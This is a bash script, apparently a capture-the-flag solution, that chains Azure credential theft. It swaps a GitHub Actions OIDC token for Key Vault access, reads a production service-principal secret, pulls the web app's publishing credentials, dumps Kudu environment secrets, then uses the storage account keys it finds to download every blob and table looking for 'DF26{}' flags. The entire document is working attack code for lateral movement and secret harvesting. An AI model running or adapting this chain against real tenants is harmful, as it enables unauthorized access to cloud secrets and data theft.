#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
TEN=$AZURE_TENANT_ID
MGMT="https://management.azure.com"
PRODKV="https://kv-tbl-prod-x3euoz.vault.azure.net"
RAPP="/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
API=2022-03-01

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
J=$(curl -sS $M -H "Authorization: Bearer $KV" "$PRODKV/secrets/reporting-service-principal?api-version=7.4" | jq -r '.value')
RS=$(curl -sS $M -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$(printf '%s' "$J"|jq -r .appId)" -d "client_secret=$(printf '%s' "$J"|jq -r '.clientSecret')" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
PUB=$(curl -sS $M -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" "$MGMT$RAPP/config/publishingcredentials/list?api-version=$API")
U=$(printf '%s' "$PUB"|jq -r '.properties.publishingUserName'); P=$(printf '%s' "$PUB"|jq -r '.properties.publishingPassword')
A=(-u "$U:$P")
echo "kudu creds passlen=${#P}"

echo "===== FULL Kudu /api/environment ====="
ENVJ=$(curl -sS $M "${A[@]}" "$SCM/api/environment")
printf '%s' "$ENVJ" | jq -r 'to_entries[] | "\(.key)=\(.value)"' 2>/dev/null | grep -aiE "config|storage|connection|secret|key|flag|vault|account|conn|df26|blob|sas|token" | grep -aviE "SCM_|REMOTEDEBUG|ORYX|WEBSITE_AUTH_(ENCRYPTION|SIGNING)" | head -60
echo "--- DF26 in env? ---"; printf '%s' "$ENVJ" | grep -aoE "DF26\{[^}]*\}" && echo "*** FLAG ***"

echo "===== extract any storage connection string ====="
CONN=$(printf '%s' "$ENVJ" | jq -r 'to_entries[] | .value' 2>/dev/null | grep -aiE "DefaultEndpointsProtocol=.*AccountKey=" | head -1)
echo "conn found: ${CONN:+yes}"
if [ -n "$CONN" ]; then
  AN=$(printf '%s' "$CONN" | sed -nE 's/.*AccountName=([^;]+).*/\1/p')
  AK=$(printf '%s' "$CONN" | sed -nE 's/.*AccountKey=([^;]+).*/\1/p')
  echo "AccountName=$AN keylen=${#AK}"
  C=(--account-name "$AN" --account-key "$AK" --only-show-errors -o tsv)
  DL=/tmp/cfg; mkdir -p "$DL"
  echo "--- containers ---"; CONTS=$(az storage container list "${C[@]}" --query '[].name' 2>/dev/null); echo "$CONTS"
  while IFS= read -r c; do [ -z "$c" ] && continue
    echo "  [container $c]"; BS=$(az storage blob list "${C[@]}" -c "$c" --query '[].name' 2>/dev/null); echo "$BS" | sed 's/^/    /'
    while IFS= read -r b; do [ -z "$b" ] && continue
      sf="$DL/$(printf '%s' "$c/$b"|tr '/ ' '__')"; az storage blob download "${C[@]}" -c "$c" -n "$b" -f "$sf" >/dev/null 2>&1 || true
    done <<< "$BS"
  done <<< "$CONTS"
  echo "--- internal-config.json contents (any container) ---"; find "$DL" -iname '*internal-config*' -exec cat {} \; 2>/dev/null | head -c 2000; echo
  echo "--- grep DF26 across config storage ---"; grep -raoE "DF26\{[^}]*\}" "$DL" 2>/dev/null | sort -u || echo "(none)"
  echo "--- tables/queues on config account ---"
  for t in $(az storage table list "${C[@]}" --query '[].name' 2>/dev/null); do az storage entity query "${C[@]}" -t "$t" 2>/dev/null | grep -aoE "DF26\{[^}]*\}" && echo "  FLAG in table $t"; done
fi
echo "CONFIG DONE"; exit 0
